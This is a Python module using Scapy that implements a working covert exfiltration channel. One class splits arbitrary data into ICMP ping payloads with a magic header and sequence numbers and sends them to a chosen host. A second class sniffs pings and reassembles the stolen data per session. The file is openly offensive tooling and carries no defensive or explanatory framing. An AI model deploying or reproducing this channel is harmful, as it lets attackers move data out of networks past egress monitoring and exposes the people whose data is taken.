import logging
import time
import struct
import threading
import queue
import base64
from typing import Optional, Dict

logger = logging.getLogger(__name__)

try:
    from scapy.all import sniff, IP, ICMP, send
    SCAPY_AVAILABLE = True
except ImportError:
    logger.warning("Scapy not installed. ICMP Exfiltration will be disabled.")
    SCAPY_AVAILABLE = False

class ICMPClientEncoder:
    """
    Encodes data into ICMP Echo Requests (Ping).
    """
    def __init__(self, destination: str, session_id: str):
        self.destination = destination
        self.session_id = session_id # 4 chars
        
    def send_data(self, data: bytes):
        if not SCAPY_AVAILABLE:
            return
            
        # Chunk data to fit in standard MTU (safe 100 bytes)
        chunk_size = 64
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            # Header: MAGIC(4) + SESSION(4) + SEQ(2)
            # MAGIC = 0xCAFEBABE
            payload = struct.pack(">I4sH", 0xCAFEBABE, self.session_id.encode(), i) + chunk
            
            pkt = IP(dst=self.destination)/ICMP(type=8)/payload
            
            send(pkt, verbose=False)
            time.sleep(0.1) 
            
        # End packet
        end_payload = struct.pack(">I4sH", 0xCAFEBABE, self.session_id.encode(), 0xFFFF)
        send(IP(dst=self.destination)/ICMP(type=8)/end_payload, verbose=False)

class ICMPListener:
    """
    Sniffs for ICMP packets containing exfiltrated data.
    """
    def __init__(self, interface: str = None):
        self.interface = interface
        self.sessions: Dict[str, Dict] = {}
        self.running = False
        self.thread = None
        
    def start(self):
        if not SCAPY_AVAILABLE:
            logger.error("Scapy missing")
            return
            
        self.running = True
        self.thread = threading.Thread(target=self._sniff_loop)
        self.thread.daemon = True
        self.thread.start()
        logger.info("[ICMP] Listener started")

    def stop(self):
        self.running = False
        # Scapy sniff is hard to stop cleanly without timeout, 
        # but setting running=False will stop processing.

    def _sniff_loop(self):
        # Filter: icmp and type echo-request (8)
        sniff(
            filter="icmp[icmptype] == 8",
            prn=self._process_packet,
            store=False,
            stop_filter=lambda x: not self.running,
            iface=self.interface
        )

    def _process_packet(self, pkt):
        if not pkt.haslayer(ICMP) or not pkt.haslayer(IP):
            return
            
        payload = bytes(pkt[ICMP].payload)
        
        # Check integrity
        if len(payload) < 10:
            return
            
        try:
            magic, session_bytes, seq = struct.unpack(">I4sH", payload[:10])
            data = payload[10:]
            
            if magic != 0xCAFEBABE:
                return
                
            session_id = session_bytes.decode()
            
            if session_id not in self.sessions:
                self.sessions[session_id] = {"chunks": {}, "complete": False, "last_seen": time.time()}
            
            if seq == 0xFFFF:
                self.sessions[session_id]["complete"] = True
                self._reassemble(session_id)
            else:
                self.sessions[session_id]["chunks"][seq] = data
                self.sessions[session_id]["last_seen"] = time.time()
                
        except Exception as e:
            pass

    def _reassemble(self, session_id: str):
        try:
            chunks = self.sessions[session_id]["chunks"]
            sorted_seqs = sorted(chunks.keys())
            full_data = b"".join([chunks[s] for s in sorted_seqs])
            
            self.sessions[session_id]["data"] = full_data
            logger.info(f"[ICMP] Session {session_id} captured {len(full_data)} bytes.")
        except Exception as e:
            logger.error(f"[ICMP] Reassembly failed: {e}")

    def get_session_data(self, session_id: str) -> Optional[bytes]:
        return self.sessions.get(session_id, {}).get("data")
